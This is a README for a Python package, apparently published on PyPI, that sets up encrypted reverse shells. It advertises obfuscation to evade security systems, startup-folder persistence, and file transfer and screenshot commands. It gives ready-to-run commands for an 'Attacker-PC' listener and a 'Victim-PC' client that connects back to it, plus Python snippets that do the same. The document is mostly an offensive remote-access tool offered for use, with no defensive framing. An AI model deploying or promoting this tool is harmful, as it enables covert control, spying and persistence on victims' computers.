# **DopeShell**
![Static Badge](https://img.shields.io/badge/Python-3.12.5-orange)
![Static Badge](https://img.shields.io/badge/License-MIT-white)
![Static Badge](https://img.shields.io/badge/PyPi-1.1.1-green)
## **Introduction**

**DopeShell** is a Python library designed to simplify the creation of secure reverse shells with advanced features like session management, encryption, multiple connections, and obfuscation techniques. This library provides an easy-to-use interface for setting up both the client and server sides of a reverse shell, with the ability to manage multiple sessions, simulate command-line prompts, and more.

## **Features**

- **Encrypted Communication**: Utilizes AES encryption to secure data transmitted between the client and server.
- **Session Management**: Handles multiple active sessions and allows the server operator to switch between them.
- **Command Prompt Simulation**: The reverse shell simulates the target's command-line interface, making it appear as if the commands are being executed locally.
- **Obfuscation Techniques**: Implements basic obfuscation to avoid detection by security systems.
- **Customizable**: Easily configure host, port, and encryption key via command-line arguments.
- **Persistence**: Easily set up persistence by saving a batch file in the startup folder to ensure reconnection on boot
- **Useful commands**: Provides useful commands like download, upload, screenshot to enhance interactivity of the shell

## **Directory Structure**

The project is organized as follows:
- **setup.py**: Contains the package configuration for installation.
- **README.md**: This documentation file.
- **LICENSE**: The project's license file.
- **dopeshell/**: The main package directory containing the server and client scripts.

## **Installation**

### **Prerequisites**

- **Python 3.7+**
- **pip** (Python package manager)

### **Installing DopeShell**

You can install `DopeShell` using `pip`:

```bash
pip install DopeShell
```

### **Building DopeShell**
If you want to build it yourself, you can use the following commands:
```
1. git clone https://www.github.com/anonymous300502/DopeShellPyPi
2. python setup.py sdist bdist_wheel
3. pip install dist/DopeShell-1.1.1-py3-none-any.whl (Replace the .whl file with the file in your dist directory)
```


## **Usage Instructions:**
#### **On the Attacker-PC, Run the following commands:**
```bash
dopeshell-server --host 192.168.1.11 --port 4444 --key "myverystrongpasswordo32bitlength"
```
*Note:*<br>
- Dopeshell uses "myverystrongpasswordo32bitlength" as the default key so you can skip the --key argument if you wish to use the default key, but we recommend using your own custom key which should be **32 bits** long.
- If you omit the --host and --port arguments, It uses '0.0.0.0' as the default IP address and '4444' as the default port.

#### **On the Victim-PC, Run the following commands:**
```bash
dopeshell-client --server-ip 192.168.1.11 --port 4444 --key "myverystrongpasswordo32bitlength"
```
*Note:*<br>
- The server ip and port arguments are **required** here, If a custom key was used in the server it should be mentioned using the --key argument. If a custom key is not used in the server side startup command, It will use the default key automatically.

### **Usage commands:**
- switch NUMBER [To switch between available sessions]
- exit [To exit the session] <br><br><br>
- persist [Set up persistence to enusre connection on reboot]<br><br><br>

*Image1- initializaiton*
![Runing server](https://raw.githubusercontent.com/anonymous300502/DopeShellPyPi/blob/main/screenshots/running.png)
*Image2- Running commands*
![basic_usage_1](https://raw.githubusercontent.com/manaswii/DopeShellPyPi/main/screenshots/basic_usage_1.png)<br><br><br>
*Image3- Switching between sessions* <br>
![basic_usage_2](https://raw.githubusercontent.com/anonymous300502/DopeShellPyPi/blob/main/screenshots/improved_exit_and_switch.png)<br><br><br>
*Image4- Setting up persistence* <br>
![presist](https://raw.githubusercontent/anonymous300502/DopeShellPyPi/blob/main/screenshots/persistence.png)<br><br><br>
*Image5- In-Shell commands* <br>
![commands](https://raw.githubusercontent/anonymous300502/DopeShellPyPi/blob/main/screenshots/commands.png)

### **Here are sample snippets if you wish to use the library in your own code:**
- test_server.py
```python
from DopeShell import DopeShellServer

key = b'myverystrongpasswordo32bitlength'

server = DopeShellServer('0.0.0.0', 4444, key)
server.run()
```
- test_client.py
```python
from DopeShell import DopeShellclient

key = b'myverystrongpasswordo32bitlength'

server = DopeShellclient('192.168.1.11', 4444, key)
server.run()

```

### **Contributing**
- Contributions are welcome! To contribute:
- Fork the repository.
- Create a new branch for your feature/bugfix.
- Write tests for your changes.
- Submit a pull request.
- Please ensure your code adheres to the project's coding standards.


### **License**
This project is licensed under the MIT License. See the LICENSE file for details.

### **Contributors:**<br>
[Manaswi Sharma](https://www.github.com/manaswii)

### **Contact Information**
For issues, questions, or suggestions, please contact:

Email: 170mailmea@gmail.com<br>
GitHub: https://github.com/anonymous300502
